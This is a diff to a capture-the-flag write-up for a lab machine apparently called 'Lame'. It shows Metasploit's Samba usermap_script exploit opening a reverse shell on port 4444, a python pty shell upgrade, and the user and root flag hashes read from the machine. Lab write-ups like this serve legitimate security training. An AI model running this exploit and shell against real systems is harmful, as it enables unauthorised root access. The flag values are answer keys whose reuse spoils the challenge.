@@ -176,19 +176,28 @@ msf6 exploit(multi/samba/usermap_script) > exploit
 ls[*] Command shell session 1 opened (10.10.14.3:4444 -> 10.10.10.3:40043 ) at 2022-04-20 15:08:34 -0400
 
 python -c 'import pty;pty.spawn("/bin/bash")'
-root@lame:/# cd root
+root@lame:/#
 ```
 
-We got shell. 
+We got a shell. 
 
-Now we just need to find the flag.
+Now we just need to find the flags.
 
 ```
+root@lame:/# cd home/makis
+root@lame:/home/makis# ls
+user.txt
+root@lame:/home/makis# cat user.txt
+cat user.txt
+9e5a90f6129df094d79ecdbe4db21668
+lroot@lame:/home/makis# cd /root
 lroot@lame:/root# ls
 Desktop  reset_logs.sh  root.txt  vnc.log
 root@lame:/root# cat root.txt
 5d55abdf8bdbd1ab2fad37ae48573605
 ```
+
+**User Flag:** `9e5a90f6129df094d79ecdbe4db21668`
 
 **Flag:** `5d55abdf8bdbd1ab2fad37ae48573605`
 
